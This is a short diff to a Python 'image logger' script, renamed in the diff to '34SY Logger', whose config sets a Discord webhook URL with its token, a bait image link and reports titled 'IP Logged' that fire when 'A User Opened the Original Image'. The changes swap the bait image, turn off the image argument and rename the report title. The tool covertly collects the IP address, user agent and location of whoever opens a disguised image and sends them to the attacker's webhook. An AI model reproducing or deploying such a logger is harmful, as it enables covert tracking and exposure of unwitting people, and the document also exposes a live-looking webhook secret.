@@ -13,9 +13,9 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1271258346455957618/_gGQHCqjfOP05punFwykcGigoPmcdC_7-LdCdfmbtbJj5-4FYB8eBjItUEyW19RXnLBe",
-    "image": "https://y.yarn.co/ac770b94-4c89-4267-a6cd-477a4dc76b57_text.gif", # You can also have a custom image by using a URL argument
+    "image": "", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "34SY Logger", # Set this to the name you want the webhook to have
@@ -144,7 +144,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "34SY Logger - IP Logged",
             "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
 
